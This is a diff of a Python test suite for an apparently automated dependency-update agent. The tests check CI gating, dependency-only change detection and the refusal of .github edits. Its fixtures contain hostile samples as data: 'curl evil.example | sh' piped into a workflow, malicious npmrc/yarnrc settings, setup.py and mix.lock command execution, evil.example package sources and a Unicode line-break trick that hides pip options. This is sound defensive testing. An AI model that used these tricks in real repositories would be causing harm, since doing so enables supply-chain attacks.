@@ -351,15 +351,15 @@ class Flow(unittest.TestCase):
         self.origin, self.seed_dir = self.tmp + "/origin.git", self.tmp + "/seed"
         sh("git", "init", "-q", "--bare", "-b", "main", self.origin)
         sh("git", "clone", "-q", self.origin, self.seed_dir)
-        put(self.seed_dir, self.seed)
+        put(self.seed_dir, self.seed if self.ci else {k: v for k, v in self.seed.items() if k != CI})
         commit_all(self.seed_dir, "seed")
         sh("git", "push", "-q", "origin", "HEAD:main", cwd=self.seed_dir)
         self.events, self.diffs, self.merges, self.codex_cmds = [], [], [], []
         self.verdicts, self.writers, self.round = [], [bump], 0
         self.writer_environs = []
         ok = {"status": "completed", "conclusion": "success"}
-        self.jobs = [dict(ok, id=1, check_suite={"id": 1})]
-        self.runs = [dict(ok, path=CI, check_suite_id=1)]
+        self.jobs = [dict(ok, id=1, check_suite={"id": 1})] if self.ci else []
+        self.runs = [dict(ok, path=CI, check_suite_id=1)] if self.ci else []
         self.state = self.tmp + "/state"
         os.makedirs(self.state)
         clock = iter(range(0, 10 ** 9, 500))
@@ -407,8 +407,9 @@ class Flow(unittest.TestCase):
                 return 0, '{"state": "MERGED"}', ""
             if field == "mergeCommit":
                 return 0, '{"mergeCommit": {"oid": "deadbeef"}}', ""
-            names = sh("git", "diff", "--name-only", "origin/main...HEAD", cwd=self.clone).split("\n")
-            return 0, json.dumps({"files": [{"path": n} for n in names if n]}), ""
+            # GitHub's list of a pull request's files stops at 100 (the first ones, in path order).
+            names = sorted(sh("git", "diff", "--name-only", "origin/main...HEAD", cwd=self.clone).split("\n"))
+            return 0, json.dumps({"files": [{"path": n} for n in names if n][:100]}), ""
         return 1, "", "unexpected gh call: %s" % cmd
 
     def sandbox(self, cwd, environ):
@@ -573,13 +574,296 @@ class BranchChecks(Branch):
         self.assertIn("whose name git has to quote", V.branch_problem(self.repo, "main"))
 
 
+def wf_run(path, conclusion, suite):
+    return {"path": path, "status": "completed", "conclusion": conclusion, "check_suite_id": suite}
+
+
+def wf_job(conclusion, suite, i=1):
+    return {"id": i, "status": "completed", "conclusion": conclusion, "check_suite": {"id": suite}}
+
+
+LINT = ".github/workflows/lint.yml"
+
+
+class ChecksState(unittest.TestCase):
+    def setUp(self):
+        self.runs, self.jobs = [], []
+        for target, new in (("paged", lambda path, key: {"check_runs": self.jobs, "workflow_runs": self.runs}[key]),
+                            ("gh_json", lambda *a, **k: [])):
+            patcher = mock.patch.object(V, target, new)
+            patcher.start()
+            self.addCleanup(patcher.stop)
+        patcher = mock.patch.object(V.time, "sleep", lambda s: None)
+        patcher.start()
+        self.addCleanup(patcher.stop)
+
+    def checks(self, runs, jobs, required=frozenset({CI})):
+        self.runs, self.jobs = runs, jobs
+        return V.checks_state("o/r", "abc", set(required), settle=0)
+
+    def test_a_required_workflow_that_ran_and_passed_is_a_pass(self):
+        self.assertEqual(self.checks([wf_run(CI, "success", 1)], [wf_job("success", 1)]), "pass")
+
+    def test_a_required_workflow_skipped_while_another_check_passed_is_skipped(self):
+        self.assertEqual(self.checks([wf_run(CI, "skipped", 1), wf_run(LINT, "success", 2)],
+                                     [wf_job("skipped", 1, 1), wf_job("success", 2, 2)]), "skipped")
+
+    def test_a_required_run_that_succeeded_with_every_job_skipped_is_skipped(self):
+        self.assertEqual(self.checks([wf_run(CI, "success", 1)], [wf_job("skipped", 1)]), "skipped")
+
+    def test_a_skipped_deploy_job_beside_a_passing_job_still_passes(self):
+        self.assertEqual(self.checks([wf_run(CI, "success", 1)], [wf_job("success", 1, 1), wf_job("skipped", 1, 2)]), "pass")
+
+    def test_a_second_passing_run_of_the_same_workflow_satisfies_it(self):
+        self.assertEqual(self.checks([wf_run(CI, "skipped", 1), wf_run(CI, "success", 2)],
+                                     [wf_job("skipped", 1, 1), wf_job("success", 2, 2)]), "pass")
+
+    def test_a_failure_still_wins_over_skipped(self):
+        self.assertEqual(self.checks([wf_run(CI, "skipped", 1), wf_run(LINT, "failure", 2)],
+                                     [wf_job("skipped", 1, 1), wf_job("failure", 2, 2)]), "fail")
+
+    def test_nothing_required_and_nothing_that_ran_is_none(self):
+        self.assertEqual(self.checks([wf_run(LINT, "skipped", 2)], [wf_job("skipped", 2)], required=()), "none")
+
+    def test_merge_blockers_for_skipped_ci_depend_on_the_kind_of_change(self):
+        self.assertEqual(V.merge_blockers("skipped", True), [])
+        self.assertEqual(V.merge_blockers("skipped", False), ["its required CI was skipped, so nothing proved the change"])
+        self.assertEqual(V.merge_blockers("none", False)[0][:16], "it changes code ")
+        self.assertEqual(V.merge_blockers("pass", False), [])
+        self.assertEqual(V.merge_blockers("fail", True), ["CI failed"])
+
+
+class MergeGate(Flow):
+    def code_change(self):
+        self.writers = [bump_then(lambda c: put(c.agent_dir, {"src/index.js": "console.log(2)\n"}))]
+
+    def test_the_fix_is_not_merged_when_the_required_workflow_was_skipped(self):
+        self.runs = [wf_run(CI, "skipped", 1), wf_run(LINT, "success", 2)]
+        self.jobs = [wf_job("skipped", 1, 1), wf_job("success", 2, 2)]
+        self.code_change()
+        res = self.fix()
+        self.assertEqual(res["status"], "blocked", res["text"])
+        self.assertIn("its required CI was skipped, so nothing proved the change", res["text"])
+        self.assertIn("pull/7", res["text"])
+        self.assertNotIn("merge", self.events)
+
+    def test_the_fix_is_not_merged_when_every_job_of_the_required_run_skipped(self):
+        self.runs, self.jobs = [wf_run(CI, "success", 1)], [wf_job("skipped", 1)]
+        self.code_change()
+        res = self.fix()
+        self.assertIn("its required CI was skipped", res["text"])
+        self.assertNotIn("merge", self.events)
+
+    def test_skipped_required_ci_still_lets_a_lockfile_only_change_merge(self):
+        self.runs, self.jobs = [wf_run(CI, "success", 1)], [wf_job("skipped", 1)]
+        res = self.fix()
+        self.assertEqual(res["status"], "merged", res["text"])
+
+    def test_skipped_required_ci_blocks_a_script_change_in_package_json(self):
+        self.runs, self.jobs = [wf_run(CI, "success", 1)], [wf_job("skipped", 1)]
+        self.writers = [bump_then(lambda c: put(c.agent_dir, {"package.json": PACKAGE.replace("node t.js", "node evil.js")}))]
+        res = self.fix()
+        self.assertEqual(res["status"], "blocked", res["text"])
+        self.assertIn("its required CI was skipped", res["text"])
+        self.assertNotIn("merge", self.events)
+
+    def test_a_failing_check_blocks_the_merge(self):
+        self.runs = [wf_run(CI, "failure", 1)]
+        res = self.fix()
+        self.assertIn("CI failed", res["text"])
+        self.assertNotIn("merge", self.events)
+
+    def test_the_automerge_kill_switch_still_blocks_the_merge(self):
+        open(V.STATE_DIR + "/DISABLE_AUTOMERGE", "w").close()
+        res = self.fix()
+        self.assertEqual(res["status"], "blocked", res["text"])
+        self.assertIn("auto-merge is switched off", res["text"])
+        self.assertIn("pull/7", res["text"])
+        self.assertNotIn("merge", self.events)
+
+
+class NoCiRepo(Flow):
+    """No workflow runs on pull requests, so only dependency entries may merge on the agent's word."""
+    ci = False
+
+    def merged(self, files):
+        self.writers = [bump_then(lambda c: put(c.agent_dir, files))]
+        res = self.fix()
+        return res["status"] == "merged", res["text"]
+
+    def test_a_lockfile_only_change_merges(self):
+        self.assertTrue(self.merged({})[0])
+
+    def test_a_dependency_bump_in_package_json_merges(self):
+        ok, text = self.merged({"package.json": PACKAGE.replace("^1.2.0", "^1.2.4")})
+        self.assertTrue(ok, text)
+
+    def test_a_scripts_change_is_blocked(self):
+        ok, text = self.merged({"package.json": PACKAGE.replace("node t.js", "node evil.js")})
+        self.assertFalse(ok)
+        self.assertIn("no CI runs on pull requests", text)
+        self.assertNotIn("merge", self.events)
+
+    def test_npmrc_is_blocked(self):
+        self.assertFalse(self.merged({".npmrc": "script-shell=/tmp/evil\n"})[0])
+
+    def test_yarnrc_is_blocked(self):
+        self.assertFalse(self.merged({".yarnrc.yml": "yarnPath: .evil.cjs\n"})[0])
+
+    def test_setup_py_is_blocked(self):
+        self.assertFalse(self.merged({"setup.py": "import os; os.system('evil')\n"})[0])
+
+    def test_mix_lock_never_merges(self):
+        ok, text = self.merged({"mix.lock": '%{"x": {:hex, :x, "1.0.0"}}\nSystem.cmd("sh", ["-c", "evil"])\n'})
+        self.assertFalse(ok)
+        self.assertIn("no CI runs on pull requests", text)
+
+    def test_a_file_past_the_hundred_github_lists_still_decides(self):
+        """GitHub's list of a pull request's files stops at 100. The rule reads the local commit instead."""
+        files = {"pkg%03d/package-lock.json" % i: LOCK for i in range(120)}
+        files["zz/.npmrc"] = "script-shell=/tmp/evil\n"
+        ok, text = self.merged(files)
+        self.assertFalse(ok)
+        self.assertIn("no CI runs on pull requests", text)
+
+
+class DependencyOnly(Branch):
+    """dependency_only on a real git branch."""
+
+    def check(self, before, after):
+        if before:
+            put(self.repo, before)
+            commit_all(self.repo, "before")
+            sh("git", "push", "-q", "origin", "HEAD:main", cwd=self.repo)
+        self.change(after)
+        return V.dependency_only(self.repo, "main", V.changed_paths(self.repo, "main"))
+
+    def cases(self, name, rows):
+        for label, before, after, expect in rows:
+            with self.subTest("%s: %s" % (name, label)):
+                self.setUp()
+                self.assertEqual(self.check({name: before} if before is not None else None, {name: after}), expect)
+
+    def test_lockfiles_and_everything_else(self):
+        self.assertTrue(self.check({"package-lock.json": "{}\n"}, {"package-lock.json": '{"a":1}\n'}))
+        self.setUp()
+        self.assertTrue(self.check({"go.sum": "a\n"}, {"go.sum": "b\n"}))
+        for name in ("mix.lock", "sub/mix.lock", ".npmrc", ".yarnrc.yml", "pnpm-workspace.yaml", "Pipfile", "requirements.in",
+                     "Gemfile", "mix.exs", "Cargo.toml", "Pipfile.lock", "src/a.js", "setup.py", "Makefile"):
+            with self.subTest(name):
+                self.setUp()
+                self.assertFalse(self.check({name: "a\n"}, {name: "b\n"}))
+
+    def test_a_new_manifest_does_not_qualify(self):
+        self.assertFalse(self.check(None, {"sub/package.json": PACKAGE}))
+
+    def test_one_file_that_needs_ci_decides_for_the_whole_change(self):
+        self.assertFalse(self.check(None, {"package-lock.json": LOCK.replace("1.2.3", "1.2.4"), "src/index.js": "x\n"}))
+
+    def test_requirements_txt_options(self):
+        r = "requirements.txt"
+        self.cases(r, [
+            ("pin bump", "x==1.0\n", "x==1.1\n", True),
+            ("hash continuation", "x==1.0 \\\n    --hash=sha256:aa\n", "x==1.1 \\\n    --hash=sha256:bb\n", True),
+            ("editable added", "x==1.0\n", "x==1.0\n-e .\n", False),
+            ("requirement file added", "x==1.0\n", "x==1.0\n-r other.txt\n", False),
+            ("index url added", "x==1.0\n", "--index-url https://evil.example/simple\nx==1.0\n", False),
+            ("extra index removed", "--extra-index-url https://a.example\nx==1.0\n", "x==1.0\n", False),
+            ("option mid-line", "x==1.0\n", "x==1.1 --global-option=evil\n", False),
+            ("option after a line break pip splits on", "x==1.0\n", "x==1.1 # note\u2028-e ./evil\n", False),
+            ("comment with a dash", "x==1.0\n", "x==1.1  # - bumped for a CVE\n", True),
+            ("utf-16 file that hides its options", "x==1.0\n", "\ufeff-e .\n".encode("utf-16"), False),
+            ("coding declaration", "x==1.0\n", "# coding: utf-16\nx==1.1\n", False),
+        ])
+
+    def test_package_json(self):
+        def pkg(**kw):
+            return json.dumps(dict({"name": "a", "version": "1.0.0", "scripts": {"test": "t"}, "dependencies": {"x": "^1.0.0"}}, **kw), indent=1)
+        base = pkg()
+        self.cases("package.json", [
+            ("dependency bump", base, pkg(dependencies={"x": "^1.0.5"}), True),
+            ("dependency added and removed", base, pkg(dependencies={"y": "2.0.0"}, devDependencies={"z": "~3"}), True),
+            ("override with nesting", base, pkg(overrides={"x": {".": "1.2.3", "y": "^2"}}), True),
+            ("pnpm overrides added", base, pkg(pnpm={"overrides": {"x": ">=1.0.5"}}), True),
+            ("npm alias", base, pkg(dependencies={"x": "npm:@scope/pkg@^1.0.0"}), True),
+            ("dollar reference", base, pkg(overrides={"x": "$x"}), True),
+            ("scripts changed", base, pkg(scripts={"test": "evil"}), False),
+            ("postinstall added", base, pkg(scripts={"test": "t", "postinstall": "evil"}), False),
+            ("own version field changed", base, pkg(version="1.0.1"), False),
+            ("git dependency", base, pkg(dependencies={"x": "github:evil/x"}), False),
+            ("url dependency", base, pkg(dependencies={"x": "https://evil.example/x.tgz"}), False),
+            ("file dependency", base, pkg(dependencies={"x": "file:../x"}), False),
+            ("nested override with url", base, pkg(overrides={"x": {"y": "git+https://evil.example/y"}}), False),
+            ("main added", base, pkg(main="evil.js"), False),
+            ("local tarball by name", base, pkg(dependencies={"x": "x-1.0.5.tgz"}), False),
+            ("parent folder", base, pkg(dependencies={"x": ".."}), False),
+            ("not json", base, "{", False),
+        ])
+
+    def test_pyproject(self):
+        def toml(deps='"requests>=2.31"', build='requires = ["setuptools"]', extra=""):
+            return '[build-system]\n%s\n\n[project]\nname = "a"\ndependencies = [%s]\n%s' % (build, deps, extra)
+        base = toml()
+        self.cases("pyproject.toml", [
+            ("dependency bump", base, toml(deps='"requests>=2.32"'), True),
+            ("dependency added", base, toml(deps='"requests>=2.31", "urllib3>=2"'), True),
+            ("optional and group", base, toml(extra='[project.optional-dependencies]\ndev = ["pytest>=8"]\n[dependency-groups]\ntest = ["pytest"]\n'), True),
+            ("uv override", base, toml(extra='[tool.uv]\noverride-dependencies = ["urllib3>=2"]\n'), True),
+            ("poetry bump", toml(extra='[tool.poetry.dependencies]\npython = "^3.9"\nx = "^1.0"\n'),
+             toml(extra='[tool.poetry.dependencies]\npython = "^3.9"\nx = "^1.1"\n'), True),
+            ("poetry group", base, toml(extra='[tool.poetry.group.dev.dependencies]\npytest = "^8"\n'), True),
+            ("build backend changed", base, toml(build='requires = ["evil-backend"]'), False),
+            ("url requirement", base, toml(deps='"requests>=2.31", "evil @ https://evil.example/e.whl"'), False),
+            ("poetry git table", toml(extra='[tool.poetry.dependencies]\nx = "^1.0"\n'),
+             toml(extra='[tool.poetry.dependencies]\nx = {git = "https://evil.example/x"}\n'), False),
+            ("poetry path table", toml(extra='[tool.poetry.dependencies]\nx = "^1.0"\n'),
+             toml(extra='[tool.poetry.dependencies]\nx = {path = "../x"}\n'), False),
+            ("tool table changed", base, toml(extra='[tool.hatch.build]\nhooks = "evil"\n'), False),
+            ("invalid toml", base, "[", False),
+        ])
+
+    def test_go_mod(self):
+        def mod(req="golang.org/x/net v0.20.0", extra=""):
+            return "module example.com/a\n\ngo 1.21\n\nrequire (\n\t%s\n)\n%s" % (req, extra)
+        base = mod()
+        self.cases("go.mod", [
+            ("require bumped in block", base, mod(req="golang.org/x/net v0.21.0"), True),
+            ("require added single line", base, mod(extra="require example.com/b v1.0.0 // indirect\n"), True),
+            ("toolchain added", base, mod(extra="toolchain go1.22.1\n"), False),
+            ("replace added", base, mod(extra="replace golang.org/x/net => ./evil\n"), False),
+            ("replace added in block", base, mod(extra="replace (\n\tgolang.org/x/net => ../evil\n)\n"), False),
+            ("go directive changed", base, base.replace("go 1.21", "go 1.22"), False),
+            ("module renamed", base, base.replace("example.com/a", "example.com/z"), False),
+            ("change hidden after // in a quoted path", mod(extra='replace golang.org/x/net => "./v//a"\n'),
+             mod(extra='replace golang.org/x/net => "./v//b"\n'), False),
+        ])
+
+
+class ForeignHosts(unittest.TestCase):
+    def hosts(self, line):
+        return V.foreign_sources("diff --git a/package-lock.json b/package-lock.json\n+" + line + "\n")
+
+    def test_registries_pass(self):
+        self.assertEqual(self.hosts('"resolved": "https://registry.npmjs.org/x/-/x-1.tgz"'), [])
+
+    def test_other_schemes_are_read_too(self):
+        self.assertEqual(self.hosts('"resolved": "git://evil.example/x.git"'), ["evil.example"])
+        self.assertEqual(self.hosts('"resolved": "git+ssh://git@evil.example/x.git"'), ["git@evil.example"])
+        self.assertEqual(self.hosts('"resolved": "ssh://evil.example/x"'), ["evil.example"])
+
+    def test_a_trick_that_ends_in_an_allowed_name_is_not_allowed(self):
+        self.assertEqual(self.hosts('"resolved": "https://registry.npmjs.org@evil.example/x.tgz"'),
+                         ["registry.npmjs.org@evil.example"])
+        self.assertEqual(self.hosts('"resolved": "https://registry.npmjs.org:8080/x.tgz"'), ["registry.npmjs.org:8080"])
+
+
 ODD_BREAKS = ["\r", "\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029"]
 
 
 class CiEdits(Flow):
     def refused(self, files):
         self.writers = [bump_then(lambda c: put(c.agent_dir, files))]
-        self.assertNotPushed(self.fix(), "it edits CI files")
+        self.assertNotPushed(self.fix(), "it edits files under .github")
 
     def test_a_workflow_edit_is_refused_before_the_push(self):
         self.refused({CI: WORKFLOW.replace("npm test", "curl evil.example | sh")})
@@ -589,6 +873,9 @@ class CiEdits(Flow):
 
     def test_a_new_composite_action_is_refused(self):
         self.refused({".github/actions/x/action.yml": "runs:\n  using: composite\n"})
+
+    def test_other_files_under_dot_github_are_refused_too(self):
+        self.refused({".github/dependabot.yml": "version: 2\n"})
 
     def test_a_case_variant_of_the_folder_is_refused(self):
         self.refused({".GitHub/Workflows/x.yml": WORKFLOW})
